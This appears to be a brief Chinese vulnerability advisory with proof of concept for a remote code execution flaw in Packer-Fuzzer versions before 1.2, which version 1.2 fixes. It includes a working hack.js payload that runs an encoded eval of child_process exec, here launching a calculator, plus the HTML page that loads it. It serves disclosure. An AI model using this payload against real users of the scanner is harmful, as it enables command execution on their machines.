# Packer-Fuzzer 漏扫工具 < 1.2 远程代码执行漏洞

利用Packer-Fuzzer扫描加载恶意Payload的网站从远程加载恶意JS导致命令执行。

目前发布的1.2版本已经修复。

**hack.js：**

```js
document.createElement("script");
q.p+"";eval(decodeURI("require(%27child_process%27).e%78ec(%27mate-calc%27)"));//"{114514:;[s].js 
```

**index.html：**

```html
<html>
    <noscript>naive!</noscript>
    <body>
        <script src="./hack.js"></script>
    </body>
</html>
```

详细分析见：https://drivertom.blogspot.com/2021/01/packer-fuzzerrce-0day.html

PoC from：https://github.com/TomAPU/poc_and_exp/tree/master/Packer-Fuzzer-RCE